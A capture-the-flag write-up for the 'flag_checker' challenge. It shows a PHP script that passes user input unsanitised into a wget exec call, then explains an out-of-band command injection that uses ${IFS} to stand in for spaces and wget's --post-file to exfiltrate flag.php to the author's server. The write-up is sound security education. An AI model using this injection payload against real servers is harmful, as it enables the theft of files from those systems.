## flag_checker

A source code was provided for this challenge :
```php
<?php
/* flag_checker */
include('flag.php');

if(!isset($_GET['flag'])) {
    highlight_file(__FILE__);
    die();
}

function checkFlag($flag) {
    $example_flag = strtolower('FAKE-X-MAS{d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789}');
    $valid = true;
    for($i = 0; $i < strlen($flag) && $valid; $i++)
        if(strpos($example_flag, strtolower($flag[$i])) === false) $valid = false;
    return $valid;
}


function getFlag($flag) {
    $command = "wget -q -O - https://kuhi.to/flag/" . $flag;
    $cmd_output = array();
    exec($command, $cmd_output);
    if(count($cmd_output) == 0) {
        echo 'Nope';
    } else {
        echo 'Maybe';
    }
}

$flag  = $_GET['flag'];
if(!checkFlag($flag)) {
    die('That is not a correct flag!');
}

getFlag($flag);
?>
```
From this code we can see it's a oob comand injection , and we can also see that  the function verify only lowercase , so we can add options to our payload with o we can add options with ${IFS}.

First of all I set up a public aws instance and i also installed  ngix.  because the aws instances gives me a public ip , then I listened ngnix on port 80 and used this payload on the challenge : http://challs.xmas.htsp.ro:3001/?flag=${IFS}-${IFS}--post-file${IFS}flag.php${IFS}1.1.1.1(
in place of 1.1.1.1 I put the public ip of the aws instance). Let's see how this payload works.
First of all i used tge $IFS variable, which is the “Internal Field Seperator” with default value <space><tab><newline> also works fine as a separator for commands , in this way the payload is a oob command injection with whitespace bypass , after i used the comand --post-file (this command is used to send the content of a file using wget) because i needed to get out to wget and send the flag.php to my asw istance.

After i went to my ngnix and intercepted the traffic with  tcpflow , more specifically with this comand " tcpflow -p -c -i eth0 port 80 " and i could see the content of the flag.php

![xmas1](https://user-images.githubusercontent.com/59454895/103447731-6ac10100-4c8f-11eb-9363-1ebdd340e3ae.PNG)
